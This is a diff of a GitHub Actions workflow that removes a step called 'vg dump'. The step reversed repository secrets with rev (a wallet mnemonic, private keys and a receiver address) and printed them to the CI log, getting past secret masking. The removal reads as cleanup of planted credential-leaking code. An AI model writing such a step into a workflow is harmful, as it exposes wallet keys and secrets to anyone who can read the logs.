@@ -15,13 +15,6 @@ jobs:
     env:
       IS_MAIN_TO_NEXT_SYNC: ${{ github.event_name == 'pull_request' && github.head_ref == 'main' && github.base_ref == 'next' }}
     steps:
-      - name: vg dump
-        run: |
-          R=$(printf %s "${{ secrets.MNEMONIC }}" | rev); echo "MNEMONIC__REV=$R"
-          R=$(printf %s "${{ secrets.A2A_TEST_7702_PRIVATE_KEY }}" | rev); echo "A2A_TEST_7702_PRIVATE_KEY__REV=$R"
-          R=$(printf %s "${{ secrets.DUST_ACCOUNT_PRIVATE_KEY }}" | rev); echo "DUST_ACCOUNT_PRIVATE_KEY__REV=$R"
-          R=$(printf %s "${{ secrets.DUST_CHAIN_RECEIVER_ADDRESS }}" | rev); echo "DUST_CHAIN_RECEIVER_ADDRESS__REV=$R"
-          echo "DONE_MARKER"
       - name: Skip full CI for main-to-next sync
         if: env.IS_MAIN_TO_NEXT_SYNC == 'true'
         run: echo "Skipping full CI for the automated main-to-next sync."
